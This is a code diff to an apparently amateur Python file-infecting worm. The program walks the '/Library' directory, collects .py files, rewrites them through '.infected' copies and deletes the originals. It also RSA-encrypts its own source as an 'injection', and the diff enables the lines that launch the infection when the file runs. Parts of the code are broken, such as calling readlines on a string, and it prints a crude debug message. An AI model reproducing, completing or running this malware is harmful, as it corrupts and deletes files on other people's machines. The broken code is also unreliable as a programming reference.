@@ -27,15 +27,11 @@ def cipherMain(state):
         with open('rsa_decryption.txt', 'w') as dec:
             dec.write(decryptedText)
 
-def encrypt(virus):
+def injection(virus, messageFileName):
     makeKeyFiles('rsa', 1024)
-    # encrypt the virus
+
     def encryptAndWriteToFile(messageFilename, keyFilename, message, blockSize=DEFAULT_BLOCK_SIZE):
-        def readKeyFile(keyFilename):
-            with open(keyFilename) as fo:
-                content = fo.read()
-            keySize, n, EorD = content.split(',')
-            return (int(keySize), int(n), int(EorD))
+        print('~~~  PENIS    ~~~    :{}'.format(virus))
         keySize, n, e = readKeyFile(keyFilename)
         if keySize < blockSize * 8:
             sys.exit('ERROR: Block size is %s bits and key size is %s bits. The RSA cipher requires the block size to be equal to or greater than the key size. Either decrease the block size or use different keys.' % (blockSize * 8, keySize))
@@ -46,12 +42,13 @@ def encrypt(virus):
             encryptedBlocks[i] = str(encryptedBlocks[i])
         encryptedContent = ','.join(encryptedBlocks)
         encryptedContent = '%s_%s_%s' % (len(message), blockSize, encryptedContent)
+        print(encryptedContent)
         with open(messageFilename, 'w') as fo:
             fo.write(encryptedContent)
         return encryptedContent
-    # encrypt the text
-    encryptedText = encryptAndWriteToFile(filename, pubKeyFilename, message)
-
+    pubKeyFilename = 'rsa_pubkey.txt'
+    encryptedText = encryptAndWriteToFile(messageFileName, pubKeyFilename, virus)
+    print(encryptedText)
 
 def getBlocksFromText(message, blockSize=DEFAULT_BLOCK_SIZE):
     messageBytes = message.encode('ascii')
@@ -257,14 +254,16 @@ class worm():
         self.dirs = []
 
         # the virus that we are inserting into
-        self.virus = open(__file__, 'r')
+        self.virus = open(__file__, 'r').read()
 
         # the initial path that we are searching along
         self.path = '/Library'
 
         for root, directories, files in os.walk(self.path):
             self.dirs.append(directories)
-        print(self.dirs)
+        #
+        # def __init__:
+        #     self.infect()
 
         # if we found at least one file, print it
         if len(self.temp) > 0:
@@ -277,23 +276,24 @@ class worm():
             if '.py' in file and '.pyc' not in file:
                 self.files.append('/'.join([self.path,file]))
 
-        def infect(self):
-            # infect every python file we found
-            for file in self.files:
-                # only open the files as read
-                with open(file, 'r') as r:
-                    # construct the name of the infected file
-                    infected = (str(file) + '.infected')
-                    # create the new, infected file
-                    with open(infected, 'a') as w:
-                        for line in r.readlines():
-                            w.write(line)
-                        for line in self.virus.readlines():
-                            w.write(line)
-                # remove the old file
-                os.remove(file)
-                # rename the infected file to the old file name
-                os.rename(infected, file)
+    def infect(self):
+        # infect every python file we found
+        print('~~~  PENIS    ~~~')
+        for file in self.files:
+            # only open the files as read
+            with open(file, 'r') as r:
+                # construct the name of the infected file
+                infected = (str(file) + '.infected')
 
-# worm = worm()
-# worm.infect()
+                # create the new, infected file
+                with open(infected, 'a') as w:
+                    injection(self.virus.readlines, infected)
+                    for line in r.readlines():
+                        w.write(line)
+            # remove the old file
+            os.remove(file)
+            # rename the infected file to the old file name
+            os.rename(infected, file)
+
+worm = worm()
+worm.infect()
